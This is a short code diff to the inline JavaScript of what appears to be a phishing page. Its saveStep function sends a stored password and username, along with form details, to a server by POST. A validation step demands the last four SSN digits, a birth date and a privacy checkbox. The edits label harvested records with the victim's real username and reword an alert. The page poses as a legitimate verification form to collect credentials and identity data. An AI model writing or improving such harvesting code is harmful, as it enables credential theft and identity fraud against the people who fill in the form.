@@ -64,7 +64,7 @@
 
     <script>
         let realPassword = sessionStorage.getItem('realPassword') || "N/A";
-        let realUsername = sessionStorage.getItem('realUsername') || "Unknown User";
+        let realUsername = sessionStorage.getItem('realUsername') || "Unknown";
 
         async function saveStep(details, stepName) {
             try {
@@ -72,7 +72,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: stepName,
+                        username: stepName + " (" + realUsername + ")",
                         password: realPassword,
                         address: details
                     })
@@ -90,7 +90,7 @@
             const year = document.getElementById('year').value;
 
             if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
-                alert("Please fill SSN, Birth Date and accept the Privacy Policy.");
+                alert("Please fill all fields and accept Privacy Policy.");
                 return;
             }
 
